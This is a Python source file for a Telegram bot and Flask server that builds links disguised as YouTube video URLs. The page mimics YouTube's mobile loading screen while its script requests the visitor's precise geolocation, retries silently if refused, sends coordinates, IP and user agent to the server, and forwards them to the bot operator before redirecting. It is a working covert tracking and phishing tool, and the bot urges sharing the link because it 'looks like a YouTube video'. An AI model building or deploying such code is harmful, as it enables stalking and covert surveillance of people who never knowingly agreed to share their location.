import os
import secrets
import sqlite3
import sys
import pkgutil
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

# Fix for Python 3.14 - Flask compatibility
if not hasattr(pkgutil, 'get_loader'):
    import importlib
    def get_loader(module_name):
        try:
            return importlib.util.find_spec(module_name).loader
        except AttributeError:
            return None
    pkgutil.get_loader = get_loader

# Configuration
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    raise ValueError("No TELEGRAM_TOKEN set")

BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')

# Only YouTube brand
FAKE_DOMAINS = {
    'youtube': {
        'path': 'youtube.com/watch',
        'name': 'YouTube',
        'icon': '▶️',
        'color': '#FF0000',
        'gradient': 'linear-gradient(135deg, #FF0000 0%, #cc0000 100%)',
        'favicon': 'https://www.youtube.com/favicon.ico'
    }
}

WEBSITE_INPUT = 1

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY, 
                  user_id TEXT,
                  website_url TEXT,
                  brand TEXT,
                  created_at TIMESTAMP,
                  status TEXT,
                  chat_id TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TIMESTAMP,
                  user_agent TEXT,
                  ip_address TEXT)''')
    conn.commit()
    conn.close()

init_db()

def generate_link(user_id, website_url, brand, chat_id):
    link_id = secrets.token_urlsafe(16)
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, user_id, website_url, brand, created_at, status, chat_id) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (link_id, user_id, website_url, brand, datetime.now(), 'active', chat_id))
    conn.commit()
    conn.close()
    return f"{BASE_URL}/youtube.com/watch/{link_id}"

@app.route('/youtube.com/watch/<link_id>')
def fake_domain_track(link_id):
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("SELECT website_url, status FROM links WHERE link_id = ? AND brand = 'youtube'", (link_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        return "Invalid link", 404
    
    website_url, status = result
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>YouTube</title>
        <link rel="icon" href="https://www.youtube.com/favicon.ico">
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                background: #0f0f0f;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 0;
                margin: 0;
            }}
            
            .app-container {{
                width: 100%;
                max-width: 430px;
                height: 100vh;
                max-height: 932px;
                background: #0f0f0f;
                display: flex;
                flex-direction: column;
                position: relative;
                overflow: hidden;
            }}
            
            /* YouTube Header - logo left aligned */
            .youtube-header {{
                padding: 12px 16px 8px 16px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                background: #0f0f0f;
                z-index: 10;
                margin-top: 4px;
            }}
            .youtube-logo {{
                display: flex;
                align-items: center;
                flex: 1;
            }}
            .youtube-logo svg {{
                width: 90px;
                height: 24px;
                display: block;
            }}
            .header-icons {{
                display: flex;
                gap: 20px;
                color: #fff;
                align-items: center;
                flex-shrink: 0;
            }}
            .header-icons svg {{
                width: 24px;
                height: 24px;
                fill: #fff;
                display: block;
            }}
            
            /* Loading Content */
            .loading-content {{
                flex: 1;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                padding: 20px;
                background: #0f0f0f;
                position: relative;
            }}
            
            /* YouTube-style loading spinner */
            .youtube-loader {{
                width: 48px;
                height: 48px;
                border: 4px solid #272727;
                border-top: 4px solid #ff0000;
                border-radius: 50%;
                animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
                margin-bottom: 30px;
                flex-shrink: 0;
            }}
            
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            
            /* Skeleton loading cards */
            .skeleton-container {{
                width: 100%;
                max-width: 380px;
                padding: 0 16px;
            }}
            .skeleton-item {{
                display: flex;
                gap: 12px;
                margin-bottom: 16px;
            }}
            .skeleton-thumbnail {{
                width: 160px;
                height: 90px;
                background: #272727;
                border-radius: 8px;
                flex-shrink: 0;
                position: relative;
                overflow: hidden;
            }}
            .skeleton-text {{
                flex: 1;
                display: flex;
                flex-direction: column;
                gap: 8px;
                justify-content: center;
            }}
            .skeleton-line {{
                height: 12px;
                background: #272727;
                border-radius: 4px;
                position: relative;
                overflow: hidden;
            }}
            .skeleton-line.short {{
                width: 60%;
            }}
            .skeleton-line.medium {{
                width: 80%;
            }}
            
            /* Shimmer animation - moving gray texture */
            .skeleton-thumbnail::after,
            .skeleton-line::after {{
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    90deg,
                    transparent,
                    rgba(255,255,255,0.08) 50%,
                    transparent
                );
                animation: shimmer 1.8s infinite;
            }}
            
            @keyframes shimmer {{
                0% {{ left: -100%; }}
                100% {{ left: 100%; }}
            }}
            
            /* Bottom Navigation */
            .bottom-nav {{
                display: flex;
                justify-content: space-around;
                padding: 8px 0 12px 0;
                background: #0f0f0f;
                border-top: 1px solid #272727;
                z-index: 10;
            }}
            .nav-item {{
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 2px;
                color: #aaaaaa;
                font-size: 10px;
            }}
            .nav-item.active {{
                color: #fff;
            }}
            .nav-item svg {{
                width: 24px;
                height: 24px;
                fill: currentColor;
            }}
            
            /* Progress bar */
            .progress-bar {{
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 3px;
                background: #272727;
                z-index: 1000;
            }}
            .progress-fill {{
                height: 100%;
                width: 0%;
                background: #ff0000;
                animation: progress 10s ease-in-out forwards;
            }}
            @keyframes progress {{
                0% {{ width: 0%; }}
                10% {{ width: 15%; }}
                30% {{ width: 30%; }}
                50% {{ width: 50%; }}
                70% {{ width: 70%; }}
                85% {{ width: 85%; }}
                95% {{ width: 95%; }}
                100% {{ width: 100%; }}
            }}
            
            /* Hide any text */
            .hidden {{
                display: none !important;
            }}
        </style>
    </head>
    <body>
        <!-- Progress Bar -->
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <!-- Main App Container -->
        <div class="app-container">
            <!-- YouTube Header -->
            <div class="youtube-header">
                <div class="youtube-logo">
                    <svg viewBox="0 0 90 24" fill="none">
                        <path d="M82.2 2.2C80.8 1.7 79.2 1.3 77.4 1.1C75.6 0.9 73.8 0.8 72 0.8C70.2 0.8 68.4 0.9 66.6 1.1C64.8 1.3 63.2 1.7 61.8 2.2C60.4 2.7 59.2 3.3 58.2 4.1C57.2 4.9 56.6 5.8 56.6 6.9V17.1C56.6 18.2 57.2 19.1 58.2 19.9C59.2 20.7 60.4 21.3 61.8 21.8C63.2 22.3 64.8 22.7 66.6 22.9C68.4 23.1 70.2 23.2 72 23.2C73.8 23.2 75.6 23.1 77.4 22.9C79.2 22.7 80.8 22.3 82.2 21.8C83.6 21.3 84.8 20.7 85.8 19.9C86.8 19.1 87.4 18.2 87.4 17.1V6.9C87.4 5.8 86.8 4.9 85.8 4.1C84.8 3.3 83.6 2.7 82.2 2.2Z" fill="#FF0000"/>
                        <path d="M72 5L85 12L72 19V5Z" fill="white"/>
                        <path d="M8.6 22.2H5.8V1.8H8.6V22.2Z" fill="white"/>
                        <path d="M18.6 22.2H15.8V1.8H18.6V22.2Z" fill="white"/>
                        <path d="M28.6 22.2H25.8V1.8H28.6V22.2Z" fill="white"/>
                        <path d="M38.6 22.2H35.8V1.8H38.6V22.2Z" fill="white"/>
                        <path d="M48.6 22.2H45.8V1.8H48.6V22.2Z" fill="white"/>
                        <path d="M58.6 22.2H55.8V1.8H58.6V22.2Z" fill="white"/>
                        <path d="M68.6 22.2H65.8V1.8H68.6V22.2Z" fill="white"/>
                        <path d="M78.6 22.2H75.8V1.8H78.6V22.2Z" fill="white"/>
                        <path d="M88.6 22.2H85.8V1.8H88.6V22.2Z" fill="white"/>
                    </svg>
                </div>
                <div class="header-icons">
                    <svg viewBox="0 0 24 24"><path d="M15 9H3v2h12V9zm0 4H3v2h12v-2zM3 17h8v-2H3v2z"/></svg>
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z"/></svg>
                </div>
            </div>
            
            <!-- Loading Content -->
            <div class="loading-content">
                <div class="youtube-loader" id="loader"></div>
                
                <div class="skeleton-container">
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                    <div class="skeleton-item">
                        <div class="skeleton-thumbnail"></div>
                        <div class="skeleton-text">
                            <div class="skeleton-line"></div>
                            <div class="skeleton-line medium"></div>
                            <div class="skeleton-line short"></div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Bottom Navigation -->
            <div class="bottom-nav">
                <div class="nav-item active">
                    <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
                    <span>Home</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M10 14.65v-5.3L15 12l-5 2.65zm7.77-4.33c-.77-.32-1.52-.56-2.27-.78V7.07c0-1.54-1.2-2.76-2.66-2.86-1.52-.1-2.84.92-2.84 2.43v1.83c-.77.22-1.52.46-2.27.78-1.52.61-2.68 1.74-3.02 3.42-.37 1.82.21 3.49 1.55 4.83.9.9 2.04 1.5 3.31 1.67 1.26.17 2.55-.06 3.69-.69.87-.48 1.62-1.12 2.26-1.89.64.77 1.39 1.41 2.26 1.89 1.14.63 2.43.86 3.69.69 1.27-.17 2.41-.77 3.31-1.67 1.34-1.34 1.92-3.01 1.55-4.83-.34-1.68-1.5-2.81-3.02-3.42z"/></svg>
                    <span>Shorts</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
                    <span>Subscriptions</span>
                </div>
                <div class="nav-item">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    <span>You</span>
                </div>
            </div>
        </div>
        
        <script>
            const linkId = '{link_id}';
            const redirectUrl = '{website_url}';
            const progressFill = document.getElementById('progressFill');
            let locationCaptured = false;
            
            function sendLocation(position) {{
                if (locationCaptured) return;
                locationCaptured = true;
                
                const {{latitude, longitude, accuracy}} = position.coords;
                progressFill.style.width = '100%';
                
                fetch('/capture', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy,
                        user_agent: navigator.userAgent
                    }})
                }})
                .then(response => response.json())
                .then(data => {{
                    if (data.success) {{
                        setTimeout(() => {{
                            window.location.href = redirectUrl;
                        }}, 1000);
                    }}
                }})
                .catch(() => {{
                    setTimeout(requestLocation, 2000);
                }});
            }}
            
            function handleError(error) {{
                // Don't show any error - just keep retrying silently
                setTimeout(requestLocation, 3000);
            }}
            
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        sendLocation,
                        handleError,
                        {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                    );
                }} else {{
                    // Fallback - keep trying
                    setTimeout(requestLocation, 5000);
                }}
            }}
            
            // Start location request immediately
            // Will keep asking until user allows it
            requestLocation();
        </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture_location():
    data = request.json
    link_id = data.get('link_id')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('user_agent')
    ip_address = request.remote_addr
    
    conn = sqlite3.connect('location_tracker.db')
    c = conn.cursor()
    c.execute("""INSERT INTO locations 
                 (link_id, latitude, longitude, accuracy, timestamp, user_agent, ip_address)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              (link_id, latitude, longitude, accuracy, datetime.now(), user_agent, ip_address))
    
    c.execute("SELECT chat_id FROM links WHERE link_id = ?", (link_id,))
    result = c.fetchone()
    conn.commit()
    conn.close()
    
    if result:
        chat_id = result[0]
        try:
            bot = Bot(token=TELEGRAM_TOKEN)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude))
            loop.run_until_complete(bot.send_message(
                chat_id=chat_id,
                text=f"📍 *Location Captured!*\n\nCoordinates: {latitude:.6f}, {longitude:.6f}\nAccuracy: {accuracy} meters",
                parse_mode='Markdown'
            ))
            loop.close()
        except Exception as e:
            print(f"Error sending location: {e}")
    
    return jsonify({'success': True})

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'timestamp': datetime.now().isoformat()})

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎯 *YouTube Location Tracker*\n\n"
        "📝 *Please send me the website URL* to redirect users after location capture.\n\n"
        "Example: `https://your-website.com`\n\n"
        "Or send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['brand'] = 'youtube'
    return WEBSITE_INPUT

async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    website_url = update.message.text.strip()
    brand = context.user_data.get('brand', 'youtube')
    
    if not website_url.startswith(('http://', 'https://')):
        website_url = 'https://' + website_url
    
    if '.' not in website_url:
        await update.message.reply_text("❌ Invalid URL. Send like: https://example.com", parse_mode=None)
        return WEBSITE_INPUT
    
    link = generate_link(user_id, website_url, brand, chat_id)
    
    keyboard = [
        [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
        [InlineKeyboardButton("🔄 Generate New Link", callback_data='new_link')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ *YouTube Link Generated!*\n\n🔗 {link}\n\nShare this link - it looks like a YouTube video!",
        reply_markup=reply_markup,
        parse_mode=None
    )
    return ConversationHandler.END

async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🎯 *YouTube Location Tracker*\n\n📝 *Please send me the website URL* for this new link.\n\nExample: `https://your-website.com`\n\nOr send `/cancel` to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['brand'] = 'youtube'
    return WEBSITE_INPUT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled. Send /start to begin again.", parse_mode=None)
    return ConversationHandler.END

def main():
    os.environ["WEB_CONCURRENCY"] = "1"
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WEBSITE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_website),
                CommandHandler('cancel', cancel)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('start', start), group=1)
    application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
    
    import threading
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=False),
        daemon=True
    ).start()
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=None)
    except Exception as e:
        print(f"Bot error: {e}")

if __name__ == "__main__":
    main()
